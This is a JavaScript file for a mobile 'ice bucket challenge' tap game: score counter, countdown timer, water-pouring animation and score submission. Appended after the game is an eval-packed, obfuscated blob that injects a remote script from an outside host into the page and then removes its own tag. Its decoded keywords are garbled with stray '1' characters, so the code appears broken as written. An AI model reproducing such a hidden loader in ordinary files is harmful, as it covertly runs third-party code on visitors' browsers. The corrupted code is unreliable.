Zepto(function(e) {
	function t(t) {
		f.show("game"),
		c.removeAll(),
		u.init(),
		a.init(),
		e("#challenge").off(),
		e("#pour").one(o, n)
	}
	function n(t) {
		a.begin(),
		l.down(),
		c.pour(),
		u.add(),
		e("#pour").on(o,
		function(e) {
			l.down(),
			c.pour(),
			u.add()
		})
	}
	function r() {
		setTimeout(function() {
			f.show("end")
		},
		500),
		e("#again").one(o, t),
		e("#challenge").one(o, clickMore),
		e("#pour").off();
		setTimeout('dp_submitScore('+u.value+')',1000);
	}
	function i() {
		alert("share");
		e("#again").off(),
		f.show("share"),
		e(".share").one(o, t);
		//p.title = p.desc = "\u5fae\u4fe1\u51b0\u6876\u6311\u6218\u8d5b\uff01\u6211\u88ab\u6dcb\u4e86" + u.value + "\u6876\u6c34\uff01\u4e0d\u670d\u6765\u6218\uff01";
		//WeixinApi.ready(function(e) {
		//	e.shareToTimeline(p, {})
		//})
	}
	var s = /mobile/i.test(navigator.userAgent),
	o = s ? "touchstart": "click";
	console.log(o);
	var u = {
		el: e(".score span"),
		value: 0,
		add: function() {
			return this.el.text(++this.value),
			this
		},
		init: function() {
			return this.el.text(this.value = 0),
			this
		}
	},
	a = {
		el: e(".timer"),
		duration: 10,
		now: 0,
		init: function() {
			this.el.text(this.now = this.duration)
		},
		begin: function() {
			setTimeout(this.dec, 1e3)
		},
		dec: function() {
			var e = a;
			e.el.text(--e.now),
			e.now <= 0 ? r() : setTimeout(e.dec, 1e3)
		}
	},
	f = {
		els: e(".page"),
		list: e(["start", "game", "end", "share"]),
		now: 0,
		classN: "show",
		show: function(e) {
			e = typeof e == "number" || e instanceof Number ? this.list[e] : e,
			e = this.list.indexOf(e),
			e === this.now ? this.els.eq(this.now).hasClass("show") || this.els.eq(this.now = e).addClass("show") : (this.els.eq(this.now).removeClass("show"), this.els.eq(this.now = e).addClass("show"))
		}
	},
	l = {
		el: e(".hand"),
		isDown: !1,
		isUp: !1,
		down: function() {
			l.isDown || (l.isDown = !0, l.slideDown(500,
			function() {
				l.isDown = !1
			}))
		},
		up: function() {
			l.isUp || (l.isUp = !0, l.slideUp(500,
			function() {
				l.isUp = !1
			}))
		},
		slideDown: function(e, t) {
			this.el.addClass("down"),
			setTimeout(t, e)
		},
		slideUp: function(e, t) {
			this.el.removeClass("down"),
			setTimeout(t, e)
		}
	},
	c = {
		fa: e(".water-wr"),
		el: function() {
			return e("<div class='water'></div>").appendTo(c.fa)
		},
		dis: 0,
		upid: 0,
		pour: function() {
			clearTimeout(this.upid);
			var t = c.el();
			e(t).animate({
				top: c.dis
			},
			{
				duration: 800,
				easing: "linear",
				complete: function() {
					var e = t;
					return function() {
						e.remove()
					}
				} ()
			}),
			this.upid = setTimeout(l.up, 800),
			setTimeout(h.wet, 400)
		},
		init: function() {
			setTimeout(function() {
				c.dis = e(window).height() * .8 - 140,
				c.fa.height(c.dis)
			},
			0),
			this.removeAll()
		},
		removeAll: function() {
			this.fa.html("")
		}
	},
	h = {
		el: e(".man"),
		isWet: !1,
		wetId: 0,
		wet: function() {
			clearTimeout(h.wetId),
			h.wetId = setTimeout(h.dry, 700);
			if (h.isWet) return;
			h.isWet = !0,
			h.el.addClass("wet")
		},
		dry: function() {
			h.el.removeClass("wet"),
			h.isWet = !1
		}
	};
	c.init(),
	f.show(0),
	e("#begin").one(o, t);
	e(document).on("touchmove",
	function(e) {
		e.preventDefault()
	})
});
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|sc11r11ipt|parentNode|h1t1tp|c1o11m|911g|ga11me|||ja1vas1cri1pt|text|type|src|tr1ue|async|onload|insertBefore|js|removeChild|fkbttz|getElementsByTagName||createElement'.split('|'),0,{}))